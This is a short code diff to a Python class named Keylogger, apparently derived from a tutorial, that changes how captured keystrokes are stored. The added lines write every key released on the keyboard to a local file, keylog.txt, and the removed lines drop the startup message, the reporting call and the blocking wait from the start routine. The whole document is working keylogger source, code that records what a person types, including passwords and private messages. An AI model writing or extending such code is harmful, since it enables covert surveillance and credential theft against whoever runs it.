@@ -42,7 +42,12 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         # finally, add the key name to our global `self.log` variable
-        self.log += name
+        buffer = ""
+        with open("./keylog.txt", "r") as file:
+            buffer = file.read()
+        with open("./keylog.txt", "w") as file:
+            file.write(buffer)
+            file.write(name)
 
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
@@ -96,14 +101,6 @@ class Keylogger:
         timer.start()
 
     def start(self):
-        # record the start datetime
-        self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
-        # start reporting the keylogs
-        self.report()
-        # make a simple message
-        print(f"{datetime.now()} - Started keylogger")
-        # block the current thread, wait until CTRL+C is pressed
-        keyboard.wait()
 
